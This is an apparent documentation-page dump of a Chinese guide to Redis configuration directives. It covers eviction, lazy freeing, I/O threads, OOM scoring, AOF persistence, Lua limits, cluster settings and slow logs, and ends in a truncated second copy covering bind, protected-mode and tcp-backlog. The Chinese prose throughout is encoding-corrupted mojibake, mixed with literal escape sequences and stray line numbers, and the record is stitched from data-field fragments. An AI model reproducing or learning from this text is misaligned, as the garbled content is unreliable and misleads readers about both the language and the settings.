5\n\n\n1\n\n\nRedis ä¸­ç LRU ä¸æ¯ä¸¥æ ¼æä¹ä¸ç LRU ç®æ³å®ç°ï¼æ¯ä¸ç§è¿ä¼¼ç LRU å®ç°ï¼ä¸»è¦æ¯ä¸ºäºèçº¦åå­å ç¨ä»¥åæåæ§è½ã\n\nRedis ç LRU æ¯ååº éç½®çæ°ç®ç key (5)ï¼ç¶åä»ä¸­éæ©ä¸ä¸ªæè¿æä¸ç»å¸¸ä½¿ç¨ç key è¿è¡ç½®æ¢ã\n\nå¯¹ LRU æ¥è¯´ 5 æ¯æ¯è¾åéçã10 å·²ç»å¾æ¥è¿äºçæ­£ç LRUï¼ä½ä¼æ¶èæ´å¤ç CPUã3 ä¼æ´å¿«ä½æ²¡æé£ä¹ç²¾ç¡®ã\n\n\n# replica-ignore-maxmemory\n\nreplica-ignore-maxmemory yes\n\n\n1\n\n\nä» Redis 5 å¼å§ï¼é»è®¤æåµä¸ï¼replica èç¹ä¼å¿½ç¥ maxmemory è®¾ç½®ï¼é¤éå¨åç failover åï¼æ­¤èç¹è¢«æåä¸º master èç¹ï¼ã è¿æå³çåªæ master æä¼æ§è¡è¿æå é¤ç­ç¥ï¼å¹¶ä¸ master å¨å é¤é®ä¹åä¼å¯¹ replica åé DEL å½ä»¤ã\n\nè¿ä¸ªè¡ä¸ºä¿è¯äº master å replicas çä¸è´æ§ï¼å¹¶ä¸è¿éå¸¸ä¹æ¯ä½ éè¦çï¼ä½æ¯è¥ä½ ç replica èç¹æ¯å¯åçï¼ æèä½ å¸æ replica èç¹æä¸åçåå­éç½®ï¼å¹¶ä¸ä½ ç¡®ä¿ææå° replica åæä½é½å¹ç­çï¼é£ä¹ä½ å¯ä»¥ä¿®æ¹è¿ä¸ªé»è®¤çè¡ä¸º ï¼è¯·ç¡®ä¿ä½ æç½ä½ å¨åä»ä¹ï¼ã\n\néè¦æ³¨æçæ¯é»è®¤æåµä¸ replica èç¹ä¸ä¼æ§è¡è¿æç­ç¥ï¼å®æå¯è½ä½¿ç¨äºè¶è¿ maxmemory è®¾å®çå¼çåå­ã å æ­¤ä½ éè¦çæ§ replicas èç¹æå¨çæºå¨å¹¶ä¸ç¡®ä¿å¨ master èç¹å°è¾¾éç½®ç maxmemory å¤§å°æ¶ï¼ replicas èç¹ä¸ä¼è¶è¿ç©çåå­çå¤§å°ã\n\n\n# active-expire-effort\n\nactive-expire-effort 1\n\n\n1\n\n\n\n# lazy freeing ææ°éæ¾\n\nlazy free åºç¨äºè¢«å¨å é¤ä¸­ï¼ç®åæ 4 ç§åºæ¯ï¼æ¯ç§åºæ¯å¯¹åºä¸ä¸ªéç½®åæ°ï¼ é»è®¤é½æ¯å³é­ã\n\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nreplica-lazy-flush no\n\n\n1\n2\n3\n4\n\n\n\n# lazyfree-lazy-eviction\n\néå¯¹ redis åå­ä½¿ç¨è¾¾å° maxmeoryï¼å¹¶è®¾ç½®ææ·æ±°ç­ç¥æ¶ï¼å¨è¢«å¨æ·æ±°é®æ¶ï¼æ¯å¦éç¨ lazy free æºå¶ï¼\n\nå ä¸ºæ­¤åºæ¯å¼å¯ lazy free, å¯è½ä½¿ç¨æ·æ±°é®çåå­éæ¾ä¸åæ¶ï¼å¯¼è´ redis åå­è¶ç¨ï¼è¶è¿ maxmemory çéå¶ãæ­¤åºæ¯ä½¿ç¨æ¶ï¼è¯·ç»åä¸å¡æµè¯ã\n\n\n# lazyfree-lazy-expire\n\néå¯¹è®¾ç½®æ TTL çé®ï¼è¾¾å°è¿æåï¼è¢« redis æ¸çå é¤æ¶æ¯å¦éç¨ lazy free æºå¶ï¼\n\næ­¤åºæ¯å»ºè®®å¼å¯ï¼å  TTL æ¬èº«æ¯èªéåºè°æ´çéåº¦ã\n\n\n# lazyfree-lazy-server-del\n\néå¯¹æäºæä»¤å¨å¤çå·²å­å¨çé®æ¶ï¼ä¼å¸¦æä¸ä¸ªéå¼ç DEL é®çæä½ãrename å½ä»¤å½ç®æ é®å·²å­å¨ï¼redis ä¼åå é¤ç®æ é®ï¼å¦æè¿äºç®æ é®æ¯ä¸ä¸ª big key, é£å°±ä¼å¼å¥é»å¡å é¤çæ§è½é®é¢ã æ­¤åæ°è®¾ç½®å°±æ¯è§£å³è¿ç±»é®é¢ï¼å»ºè®®å¯å¼å¯ã\n\n\n# slave-lazy-flush\n\néå¯¹ slave è¿è¡å¨éæ°æ®åæ­¥ï¼slave å¨å è½½ master ç RDB æä»¶åï¼ä¼è¿è¡ flushall æ¥æ¸çèªå·±çæ°æ®åºæ¯ï¼åæ°è®¾ç½®å³å®æ¯å¦éç¨å¼å¸¸ flush æºå¶ãå¦æåå­åå¨ä¸å¤§ï¼å»ºè®®å¯å¼å¯ãå¯åå°å¨éåæ­¥èæ¶ï¼ä»èåå°ä¸»åºå è¾åºç¼å²åºçæ¶¨å¼èµ·çåå­ä½¿ç¨å¢é¿ã\n\n\n# lazyfree-lazy-user-del\n\nå¯¹äºä¸å®¹æç¨ UNLINK è°ç¨æ¿æ¢ç¨æ·ä»£ç  DEL è°ç¨çæåµï¼ä¹å¯ä»¥ä½¿ç¨ lazyfree-lazy-user-del yes éç½®æä»¤å° DEL å½ä»¤çé»è®¤è¡ä¸ºä¿®æ¹ä¸ºä¸ UNLINK å®å¨ç¸åã\n\n\n# threaded I/O çº¿ç¨\n\né»è®¤æåµä¸ï¼çº¿ç¨æ¯ç¦ç¨çï¼æä»¬å»ºè®®ä»å¨å·æè³å° 4 ä¸ªææ´å¤åæ ¸çè®¡ç®æºä¸å¯ç¨å®ï¼èè³å°ä¿çä¸ä¸ªå¤ç¨åæ ¸ãä½¿ç¨ 8 ä¸ªä»¥ä¸ççº¿ç¨ä¸å¤ªå¯è½æå¾å¤§å¸®å©ãæä»¬è¿å»ºè®®å¨ç¡®å®å­å¨æ§è½é®é¢æ¶åä½¿ç¨çº¿ç¨ I / Oï¼Redis å®ä¾ä¼ä½¿ç¨å¾å¤§ä¸é¨å CPU æ¶é´ï¼å¦åå°±æ²¡æå¿è¦ä½¿ç¨æ­¤åè½ã\n\nio-threads 4\n\n\n1\n\n\nå æ­¤ï¼å¦ææ¨æåä¸ªæ ¸çï¼è¯·å°è¯ä½¿ç¨ 2 æ 3 ä¸ª I / O çº¿ç¨ï¼å¦ææ¨æ 8 ä¸ªæ ¸ï¼è¯·å°è¯ä½¿ç¨ 6 ä¸ªçº¿ç¨ã\n\n\n# io-threads-do-reads\n\nio-threads-do-reads no\n\n\n1\n\n\néå¸¸ï¼å° io-threads è®¾ç½®ä¸º 1 åªä¼ä½¿ç¨ä¸»çº¿ç¨ãå¯ç¨ I / O çº¿ç¨åï¼æä»¬ä»å°çº¿ç¨ç¨äºåæä½ï¼å³å¯¹ write ç³»ç»è°ç¨è¿è¡çº¿ç¨åï¼å¹¶å°å®¢æ·ç«¯ç¼å²åºä¼ è¾å°å¥æ¥å­ãä½æ¯ï¼ä¹å¯ä»¥éè¿ io-threads-do-reads yes æ¥å¯ç¨è¯»åçº¿ç¨ååè®®è§£æãéå¸¸ï¼çº¿ç¨è¯»åæ²¡æå¤ªå¤§å¸®å©ã\n\næ æ³å¨è¿è¡æ¶éè¿ CONFIG SET æ´æ¹æ­¤éç½®æä»¤ãå¯ç¨ S SL æ¶ï¼Aso æ­¤åè½å½åä¸èµ·ä½ç¨ã\n\n\n# kernel oom control åæ ¸ oom æ§å¶\n\nè¿ä¸ª oom-score-adj åæ°æ¯ç¨æ¥ Linux åæ ¸æ§å¶è°ä¼çï¼å¨ Linux ç³»ç»ä¸­ï¼å½åå­æº¢åºæ¶ï¼å¯ä»¥æç¤ºåæ ¸ OOM killer åºè¯¥é¦åææ­»åªäºè¿ç¨ã\n\noom-score-adj no\n\n\n1\n\n\nå¯ç¨æ­¤åè½å¯ä½¿ Redis æ ¹æ®å¶è¿ç¨ä¸»å¨æ§å¶å¶ææè¿ç¨ç oom_score_adj å¼ãé»è®¤åæ°å°å°è¯ä½¿åå°å­è¿ç¨å¨ææå¶ä»è¿ç¨ä¹åè¢«ææ­»ï¼è replicas å¨ä¸»æ°æ®åºä¹åè¢«ææ­»ã\n\noom-score-adj-values 0 200 800\n\n\n1\n\n\né»è®¤ oom-score-adj-values ä¸è®¾ç½®çæåµä¸ä¼ä¼åææ­»åå°å­è¿ç¨ï¼ç¶åä¸»ä»èç¹ä¼åä¼åææ­»ä»èç¹ã\n\næä»¥è¿ 3 ä¸ªå¼åå«ç¨æ¥è®¾ç½®ä¸»ãä»ãåå°å­è¿ç¨çåå¼çï¼åå¼èå´ä» -1000 ~ 1000ï¼åå¼è¶é«è¶æå¯è½è¢«åææ­»ã\n\n\n# append only mode AOF è¿½å æ¨¡å¼\n\nRedis å¯ä»¥å®ç°æ°æ®çæä¹åå­å¨ï¼å³å°æ°æ®ä¿å­å°ç£çä¸ã\nRedis çæä¹åå­å¨æä¾ä¸¤ç§æ¹å¼ï¼RDB ä¸ AOFãRDB æ¯é»è®¤éç½®ãAOF éè¦æå¨å¼å¯ã\nç°å¨ Redis çéç½®ä¸­é»è®¤æ¯å³é­ AOF æ¨¡å¼çã\n\n\n# appendonly\n\nappendonly no\n\n\n1\n\n\næ¯å¦å¼å¯ AOF\n\n\n# appendfilename\n\nappendfilename "appendonly.aof"\n\n\n1\n\n\nä¿å­æ°æ®ç AOF æä»¶åç§°\n\n\n# appendfsync\n\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n\n1\n2\n3\n\n\nRedis æ¯æ 3 ç§ä¸åçæ¨¡å¼ï¼\n\n * noï¼ä¸å³æ¶åæ­¥ï¼ç±æä½ç³»ç»æ§å¶ä½æ¶å·åå°ç£çä¸ï¼è¿ç§æ¨¡å¼éåº¦æå¿«ï¼\n * alwaysï¼æ¯æ¬¡åªåæ¥å¿ï¼éåº¦è¾æ¢ï¼ä½æå®å¨ï¼\n * everysecï¼æ¯ç§éåæ­¥ä¸æ¬¡ï¼æä¸­çæ¹æ¡ã\n\n\n# no-appendfsync-on-rewrite\n\nno-appendfsync-on-rewrite no\n\n\n1\n\n\nå½ä½¿ç¨ AOF ç appendfsync è®¾ç½®ä¸º always æ everysec æ¶ï¼åå°çå­å¨è¿ç¨ä¼æ§è¡å¤§éçç£ç I/O æä½ï¼å¨ä¸äº Linux æ¶æä¸­ï¼Redis fsync () è°ç¨æ¶å¯è½ä¼é»å¡å¾ä¹ãè¿ä¸ªé®é¢å½åå¹¶æ²¡æä¿®å¤ï¼å³ä½¿æ¯å¨ä¸ä¸ªä¸åççº¿ç¨æ§è¡ fsync ä¹ä¼é»å¡æä»¬çåæ­¥åè°ç¨ã\n\nä¸ºäºç¼è§£è¿ä¸ªé®é¢ï¼å¯ä»¥ä½¿ç¨ä»¥ä¸éé¡¹ï¼å®å°ä¼å¨æä¸ä¸ª BGSAVE æ BGREWRITEAOF æ­£å¨è¿è¡æ¶ï¼é»æ­¢ä¸»è¿ç¨è°ç¨ fsync ()ã\n\nè¿æå³çæå¦ä¸ä¸ªå­è¿ç¨å¨å­å¨æ¶ï¼Redis çæä¹æ§ç­åäº appendfsync noãå¨å®è·µä¸­ï¼æå³çå¨æåçæåµä¸å®å¯è½ä¸¢å¤±å¤è¾¾ 30 ç§çæ¥å¿ï¼é»è®¤ç Linux è®¾ç½®ï¼ã\n\nå¦æä½ ææ½å¨çé®é¢éè¦æ´æ¹å®ä¸º âyesâãå¦åä»æä¹æ§çè§ç¹æ¥ç ânoâ æ¯æå®å¨çéæ©ã\n\n\n# auto-aof-rewrite-percentage auto-aof-rewrite-min-size\n\nauto-aof-rewrite-percentage 100\n\n\n1\n\n\naof æä»¶å¢é¿æ¯ä¾ï¼æå½å aof æä»¶æ¯ä¸æ¬¡éåçå¢é¿æ¯ä¾å¤§å°ãaof éåå³å¨ aof æä»¶å¨ä¸å®å¤§å°ä¹åï¼éæ°å°æ´ä¸ªåå­åå° aof æä»¶å½ä¸­ï¼ä»¥åæ ææ°çç¶æ (ç¸å½äº bgsave)ãè¿æ ·å°±é¿åäºï¼aof æä»¶è¿å¤§èå®éåå­æ°æ®å°çé®é¢ (é¢ç¹ä¿®æ¹æ°æ®é®é¢).\n\n\n# auto-aof-rewrite-min-size\n\nauto-aof-rewrite-min-size 64mb\n\n\n1\n\n\naof æä»¶éåæå°çæä»¶å¤§å°ï¼å³æå¼å§ aof æä»¶å¿é¡»è¦è¾¾å°è¿ä¸ªæä»¶æ¶æè§¦åï¼åé¢çæ¯æ¬¡éåå°±ä¸ä¼æ ¹æ®è¿ä¸ªåéäº (æ ¹æ®ä¸ä¸æ¬¡éåå®æä¹åçå¤§å°). æ­¤åéä»åå§åå¯å¨ redis ææãå¦ææ¯ redis æ¢å¤æ¶ï¼å lastSize ç­äºåå§ aof æä»¶å¤§å°ã\n\n# rewrite æºå¶\n\nå¶å® Redis oaf æºå¶åæ¬äºä¸¤ä»¶äºï¼rewrite å AOFãrewrite ç±»ä¼¼äºæ®éæ°æ®åºç®¡çç³»ç»æ¥å¿æ¢å¤ç¹ï¼å½ AOF æä»¶éçåå½ä»¤çè¿è¡è¨èæ¶ï¼å½æä»¶å¤§å°è§¦ç¢°å°ä¸´çæ¶ï¼rewrite ä¼è¢«è¿è¡ã\n\nrewrite ä¼åå¤å¶ä¸æ ·ï¼fork åºä¸ä¸ªå­è¿ç¨ï¼åå»ºä¸ä¸ªä¸´æ¶æä»¶ï¼éåæ°æ®åºï¼å°æ¯ä¸ª keyãvalue å¯¹è¾åºå°ä¸´æ¶æä»¶ãè¾åºæ ¼å¼å°±æ¯ Redis çå½ä»¤ï¼ä½æ¯ä¸ºäºåå°æä»¶å¤§å°ï¼ä¼å°å¤ä¸ª keyãvalue å¯¹éåæ´çç¨ä¸æ¡å½ä»¤è¡¨è¾¾ãå¨ rewrite æé´çåæä½ä¼ä¿å­å¨åå­ç rewrite buffer ä¸­ï¼rewrite æååè¿äºæä½ä¹ä¼å¤å¶å°ä¸´æ¶æä»¶ä¸­ï¼å¨æåä¸´æ¶æä»¶ä¼ä»£æ¿ AOF æä»¶ã\n\nç®åæ¥è¯´ï¼aof éå­æ¾äºææç redis æä½æä»¤ï¼å½ aof æä»¶è¾¾å°ä¸å®æ¡ä»¶æèæå¨ bgrewriteaof å½ä»¤é½å¯ä»¥è§¦å rewriteãrewrite ä¹å aof æä»¶ä¼ä¿å­ keys çæåçç¶æï¼æ¸é¤æä¹ååä½çï¼æ¥ç¼©å°è¿ä¸ªæä»¶ãè¿éæè°çç¼©å°å°±æ¯ æ´çæä»¤ ï¼æ¯å¦å®¢æ·ç«¯åéè¿ä¸ä¸ªå½ä»¤ï¼\n\nlpush key 1 2 3\n# ç§»åºå·¦è¾¹ç¬¬ä¸ä¸ªåç´ ï¼ä¹å°±æ¯æä¸é¢çåç´  1 ç§»åº\nlpop key \nlpush key 4 5 6\n\n\n1\n2\n3\n4\n\n\næ´çåçæä»¤æä»¶æ¯\n\nlpush key 4 5 6 2 3\n\n\n1\n\n\n\n# aof-load-truncated\n\naof-load-truncated yes\n\n\n1\n\n\næ redis å¨æ¢å¤æ¶ï¼ä¼å¿½ç¥æåä¸æ¡å¯è½å­å¨é®é¢çæä»¤ãé»è®¤å¼ yesãå³å¨ aof åå¥æ¶ï¼å¯è½å­å¨æä»¤åéçé®é¢ (çªç¶æ­çµï¼åäºä¸å)ï¼è¿ç§æåµä¸ï¼yes ä¼ log å¹¶ç»§ç»­ï¼è no ä¼ç´æ¥æ¢å¤å¤±è´¥.\n\n\n# aof-use-rdb-preamble\n\naof-use-rdb-preamble yes\n\n\n1\n\n\næ··åæä¹ååæ ·ä¹æ¯éè¿ bgrewriteaof å®æçï¼ä¸åçæ¯å½å¼å¯æ··åæä¹åæ¶ï¼fork åºçå­è¿ç¨åå°å±äº«çåå­å¯æ¬å¨éçä»¥ RDB æ¹å¼åå¥ aof æä»¶ï¼ç¶åå¨å°éåç¼å²åºçå¢éå½ä»¤ä»¥ AOF æ¹å¼åå¥å°æä»¶ï¼åå¥å®æåéç¥ä¸»è¿ç¨æ´æ°ç»è®¡ä¿¡æ¯ï¼å¹¶å°æ°çå«æ RDB æ ¼å¼å AOF æ ¼å¼ç AOF æä»¶æ¿æ¢æ§çç AOF æä»¶ãç®åçè¯´ï¼æ°ç AOF æä»¶ååæ®µæ¯ RDB æ ¼å¼çå¨éæ°æ®ååæ®µæ¯ AOF æ ¼å¼çå¢éæ°æ®ã\n\n\n# lua scripting lua èæ¬\n\nRedis æä¾äº Lua èæ¬åè½æ¥è®©ç¨æ·å®ç°èªå·±çåå­å½ä»¤ï¼ä½ä¹å­å¨çé£é©ï¼ç¼åä¸å½çèæ¬å¯è½é»å¡çº¿ç¨å¯¼è´æ´ä¸ª Redis æå¡ä¸å¯ç¨ã\n\nlua-time-limit 5000\n\n\n1\n\n\nRedis çéç½®æä»¶ä¸­æä¾äºå¦ä¸éç½®é¡¹æ¥è§å®æå¤§æ§è¡æ¶é¿ã\n\nä½è¿éæä¸ªåï¼å½ä¸ä¸ªèæ¬è¾¾å°æå¤§æ§è¡æ¶é¿çæ¶åï¼Redis å¹¶ä¸ä¼å¼ºå¶åæ­¢èæ¬çè¿è¡ï¼ä»ä»å¨æ¥å¿éæå°ä¸ªè­¦åï¼åç¥æèæ¬è¶æ¶ã\n\nå ä¸º Redis å¿é¡»ä¿è¯èæ¬æ§è¡çåå­æ§ï¼ä¸­éåæ­¢å¯è½å¯¼è´åå­çæ°æ®éä¸åªä¿®æ¹äºé¨åæ°æ®ã\n\nå¦ææ¶é¿è¾¾å° Lua-time-limit è§å®çæå¤§æ§è¡æ¶é´ï¼Redis åªä¼åè¿å ä»¶äºæï¼\n\n * æ¥å¿è®°å½æèæ¬è¿è¡è¶æ¶\n * å¼å§åè®¸æ¥åå¶ä»å®¢æ·ç«¯è¯·æ±ï¼ä½ä»éäº SCRIPT KILL å SHUTDOWN NOSAVE ä¸¤ä¸ªå½ä»¤\n * å¶ä»è¯·æ±ä»è¿å busy éè¯¯\n\n\n# - cluster éç¾¤\n\ncluster-enabled yes\n\n\n1\n\n\nå¼å¯éç¾¤æ¨¡å¼\n\ncluster-config-file nodes-6379.conf\n\n\n1\n\n\n1ãè¿ä¸ªéç½®æä»¶ä¸æ¯è¦æä»¬å»éçï¼èæ¯ Redis è¿è¡æ¶ä¿å­éç½®çæä»¶ï¼æä»¥æä»¬ä¹ä¸å¯ä»¥ä¿®æ¹è¿ä¸ªæä»¶ã\n\n2ãRedis éç¾¤èç¹æ¯æ¬¡åçæ´æ¹æ¶èªå¨ä¿çéç¾¤éç½®ï¼åºæ¬ä¸ä¸ºç¶æï¼çæä»¶ï¼ä»¥ä¾¿è½å¤ å¨å¯å¨æ¶éæ°è¯»åå®ã\n\n3ãè¯¥æä»¶ååºäºéç¾¤ä¸­å¶ä»èç¹ï¼å®ä»¬çç¶æï¼æä¹åéç­ç­ä¿¡æ¯ã ç±äºæäºæ¶æ¯çæ¥æ¶ï¼éå¸¸ä¼å°æ­¤æä»¶éåå¹¶å·æ°å°ç£çä¸ã\n\n4ãçæçæä»¶å¨ dir æå®è·¯å¾ä¸\n\ncluster-node-timeout 15000\n\n\n1\n\n\nè¶æ¶æ¶é´æ¯éç¾¤ä¸­åèç¹ç¸äºéè®¯æ¶ï¼åè®¸ "å¤±è" çæå¤§æ¯«ç§æ°ï¼ä¸é¢çéç½®ä¸º 15 ç§ï¼å¦æè¶è¿ 15 ç§æä¸ªèç¹æ²¡åå¶å®èç¹æ±æ¥æåï¼è®¤ä¸ºè¯¥èç¹æäºã\n\ncluster-replica-validity-factor 10\n\n\n1\n\n\n1ãå¦æè®¾ç½®ä¸º 0ï¼æ è®ºä¸»èç¹åä»èç¹ä¹é´çé¾è·¯æ­å¼è¿æ¥çæ¶é´é¿ç­ï¼ä»èç¹é½å°å°è¯æéåæ¢ä¸ºä¸»èç¹ã\n\n2ã å¦æè¯¥å¼ä¸ºæ­£å¼ï¼åè®¡ç®æå¤§æ­å¼æ¶é´ä½ä¸ºèç¹è¶æ¶å¼ä¹ä»¥æ­¤éé¡¹æä¾çç³»æ°ï¼å¦æè¯¥èç¹æ¯ä»èç¹ï¼åå¨ä¸»é¾è·¯æ­å¼è¿æ¥çæ¶é´è¶è¿æå®çè¶æ¶å¼æ¶ï¼å®ä¸ä¼å°è¯å¯å¨æéåæ¢ã ä¾å¦ï¼å¦æèç¹è¶æ¶è®¾ç½®ä¸º 5 ç§ï¼å¹¶ä¸ææå å­è®¾ç½®ä¸º 10ï¼åä¸ä¸»èç¹æ­å¼è¿æ¥è¶è¿ 50 ç§çä»èç¹å°ä¸ä¼å°è¯å¯¹å¶ä¸»èç¹è¿è¡æéåæ¢ã\n\n3ãè¯·æ³¨æï¼å¦ææ²¡æä»æå¡å¨èç¹è½å¤å¯¹å¶è¿è¡æéè½¬ç§»ï¼åä»»ä½éé¶å¼é½å¯è½å¯¼è´ Redis éç¾¤å¨ä¸»æå¡å¨åºç°æéåä¸å¯ç¨ã å¨è¿ç§æåµä¸ï¼åªæåå§ä¸»èç¹éæ°å å¥éç¾¤æ¶ï¼éç¾¤æä¼è¿åå¯ç¨ã\n\ncluster-migration-barrier 1\n\n\n1\n\n\nä¸»èç¹å°ä¿æè¿æ¥çæå°ä»èç¹æ°éï¼ä»¥ä¾¿å¦ä¸ä¸ªä»èç¹è¿ç§»å°ä¸åä»»ä½ä»èç¹è¦ççä¸»èç¹ã\n\ncluster-require-full-coverage yes\n\n\n1\n\n\nå½ cluster-require-full-coverage ä¸º no æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä»ç¶å¯ç¨ã\n\nå½ cluster-require-full-coverage ä¸º yes æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä¸å¯ç¨ã\n\ncluster-replica-no-failover no\n\n\n1\n\n\nè®¾ç½®ä¸º yes æ¶ï¼æ­¤éé¡¹å¯é²æ­¢ä»æå¡å¨å¨ä¸»æå¡å¨æéæé´å°è¯å¯¹ä¸»æå¡å¨è¿è¡æéè½¬ç§»ãä½æ¯ï¼ä¸»æå¡å¨ä»ç¶å¯ä»¥æ§è¡æå¨æéè½¬ç§»ï¼å¦æè¢«è¿«æ§è¡ï¼ã\n\ncluster-allow-reads-when-down no\n\n\n1\n\n\né»è®¤ä¸º no, è¡¨ç¤ºå½éç¾¤å ä¸»èç¹æ°éè¾¾ä¸å°æå°å¼æææ£åæ§½æ²¡æåéèè¢«æ è®°ä¸ºå¤±ææ¶ï¼èç¹å°åæ­¢ææçå®¢æ·ç«¯éè®¯ã è¿æ ·å¯ä»¥é¿åä»ä¸ä¸ªä¸ç¥ééç¾¤ç¶æååçèç¹è¯»å°ä¸ä¸è´æ°æ®çå±é©ã è®¾ä¸º yes ååè®¸éç¾¤å¤±ææ¶ä»å¯ä»¥ç±èç¹ä¸­è¯»åæ°æ®ã è¿æ ·æ¢ä¿è¯è¯»æä½çé«å¯ç¨æ§ï¼ ä¹é¿åä¸ä¸è´åæä½ï¼åæ¶å½ Redis Cluster ä»åå« 1 è³ 2 ä¸ªèç¹ï¼èæä¸ªèç¹å¤±æåæ å¯ç¨ä»èç¹æ¿ä»£ï¼ä¸å èç¹æ°éä¸è¶³ï¼æ æ³èªå¨éæ°åéæ£åæ§½ï¼åè¯¥åæ°è®¾ä¸º yes å¯ä¿è¯èç¹ä»ç¶å¯æ§è¡è¯»æä½ã\n\n\n# slow log æ¢æ¥å¿\n\nslowlog-log-slower-than 1000\n\n\n1\n\n\nå¶ä¸­ slowlog-log-slower-than è¡¨ç¤º slowlog çåå®çéï¼åªæ query æ§è¡æ¶é´å¤§äº slowlog-log-slower-than çæä¼å®ä¹ææ¢æ¥è¯¢ï¼æä¼è¢« slowlog è¿è¡è®°å½ãslowlog-log-slower-than è®¾ç½®çåä½æ¯å¾®å¦ï¼é»è®¤æ¯ 10000 å¾®å¦ï¼ä¹å°±æ¯ 10ms\n\nslowlog-max-len 128\n\n\n1\n\n\nslowlog-max-len è¡¨ç¤ºæ¢æ¥è¯¢æå¤§çæ¡æ°ï¼å½ slowlog è¶è¿è®¾å®çæå¤§å¼åï¼ä¼å°ææ©ç slowlog å é¤ï¼æ¯ä¸ª FIFO éå\n\n\n# latency monitor å»¶è¿çè§å¨\n\nlatency-monitor-threshold 0\n\n\n1\n\n\nredis å»¶æ¶çæ§ç³»ç»å¨è¿è¡æ¶ä¼éæ ·ä¸äºæä½ï¼ä»¥ä¾¿æ¶éå¯è½å¯¼è´å»¶æ¶çæ°æ®æ ¹æºã\néè¿ LATENCY å½ä»¤ å¯ä»¥æå°ä¸äºå¾æ ·åè·åä¸äºæ¥åï¼æ¹ä¾¿çæ§\nè¿ä¸ªç³»ç»ä»ä»è®°å½é£ä¸ªæ§è¡æ¶é´å¤§äºæç­äºé¢å®æ¶é´ï¼æ¯«ç§ï¼çæä½ï¼\nè¿ä¸ªé¢å®æ¶é´æ¯éè¿ latency-monitor-threshold éç½®æ¥æå®çï¼\nå½è®¾ç½®ä¸º 0 æ¶ï¼è¿ä¸ªçæ§ç³»ç»å¤äºåæ­¢ç¶æ\n\n\n# event notification äºä»¶éç¥\n\nnotify-keyspace-events ""\n\n\n1\n\n\n\n# advanced config é«çº§éç½®\n\nå½åå¸æ¡ç®åªæå°éæ¡ç®ä¸æå¤§æ¡ç®æªè¶è¿ç»å®éå¼æ¶ï¼å°ä½¿ç¨åå­é«æçæ°æ®ç»æå¯¹å¶è¿è¡ç¼ç \n\nhash-max-ziplist-entries 512\n\n\n1\n\n\næ°æ®éå°äºç­äº hash-max-ziplist-entries çç¨ ziplistï¼å¤§äº hash-max-ziplist-entries ç¨ hash\n\nhash-max-ziplist-value 64\n\n\n1\n\n\nvalue å¤§å°å°äºç­äº hash-max-ziplist-value çç¨ ziplistï¼å¤§äº hash-max-ziplist-value ç¨ hashã',normalizedContent:'> + é»è®¤éç½®æå¼ï¼- é»è®¤éç½®å³é­\n\n\n# network ç½ç»\n\n\n# + bind\n\n# ç»å®ip\nbind 127.0.0.1\n\n\n1\n2\n\n\né»è®¤æ¯ 127.0.0.1ï¼ä¿®æ¹ç ip å¦æä¸ä¸ºæ¬æº ip æ¯æ æ³å¯å¨çãå¯ä»¥ç´æ¥æ³¨é bindï¼è¿æ ·æææºå¨å¯è¿ï¼ä½ä¼å protected-mode åæ°å½±åã\n\n\n# + protected-mode\n\n# åä¿æ¤ç é»è®¤å¼å¯\nprotected-mode yes\n\n\n1\n2\n\n\nä¿æ¤æ¨¡å¼ä¸ï¼æ è®º bind æ¯å¦è¢«æ³¨éé½æ æ³è¿ç¨è®¿é®ãæ³åè®¸å¤ç½æå±åç½è®¿é®éè¦å³é­ä¿æ¤æ¨¡å¼ï¼ä¸æ³¨é bindã\n\n\n# + port\n\n### ç«¯å£é»è®¤\nport 6379\n\n\n1\n2\n\n\n\n# + tcp-backlog\n\ntcp-backlog 511\n\n\n1\n\n\nlinux åæ ¸ä¸ºæ¯ä¸ª tcp æå¡å¨ç¨åºç»´æ¤ä¸¤æ¡ backlog éåï¼ä¸æ¡æ¯ tcp å±çæªè¿æ¥éåï¼ä¸æ¡æ¯åºç¨å±çå·²è¿æ¥éåï¼åå«å¯¹åº net.ipv4.tcp_max_syn_backlog å net.core.somaxconn ä¸¤ä¸ªåæ ¸åæ°ã\n\nä¸ä¸ªå®¢æ·ç«¯è¿æ¥å¨å®æ tcp 3 æ¬¡æ¡æä¹åé¦åè¿å¥å°æªè¿æ¥éåï¼å®ææ¡æä¹åæ­£å¼å»ºç«è¿æ¥ï¼è¿å¥å·²è¿æ¥éåï¼äº¤ä»ç»åºç¨ç¨åºå¤çãåºç¨ç¨åºè°ç¨ accept () å½æ°ä»å·²è¿æ¥éåååºè¿æ¥è¿è¡å¤çãåºç¨å±å¨è°ç¨ listen () å½æ°æ¶æå®ç backlog æ¯å·²è¿æ¥éåå¤§å°ï¼å¦æå¤§äº somaxconn å°è¢«è®¾ä¸º somaxconnã\n\nå¦æåºç¨å±ä¸è°ç¨ accept () å½æ°å¤çä¸ä¸ªè¿æ¥ï¼æèå¤çä¸åæ¶çè¯ï¼å°ä¼å¯¼è´å·²è¿æ¥éåå æ»¡ãå·²è¿æ¥éåå·²æ»¡çè¯ä¼å¯¼è´æªè¿æ¥éåå¨å¤çå® 3 æ¬¡æ¡æä¹åæ æ³è¿å¥å·²è¿æ¥éåï¼æç»ä¹å¯¼è´æªè¿æ¥éåå æ»¡ï¼å¨æå¡å¨çå°å¤äºæªè¿æ¥éåä¸­çè¿æ¥ç¶æä¸º syn_recvã æ°è¿æ¥çå®¢æ·ç«¯è¿æ¥å°ä¼ä¸ç´å¤äº syn_sent ç¶æç­å¾æå¡å¨ç ack åºç­ï¼æç»å¯¼è´è¿æ¥è¶æ¶ã\n\n# æ¥çéåå¤§å°\n\næ¥çæªè¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/ipv4/tcp_max_syn_backlog\n\n\n1\n\n\næ¥çå·²è¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/core/somaxconn\n\n\n1\n\n\n# ä¿®æ¹éåå¤§å°\n\nå¯ä»¥ç´æ¥æ¹åè¿ä¸¤ä¸ªæä»¶çå¼ãè¦æ°¸ä¹ä¿®æ¹è¿ä¸¤ä¸ªåæ ¸åæ°çè¯å¯ä»¥åå° 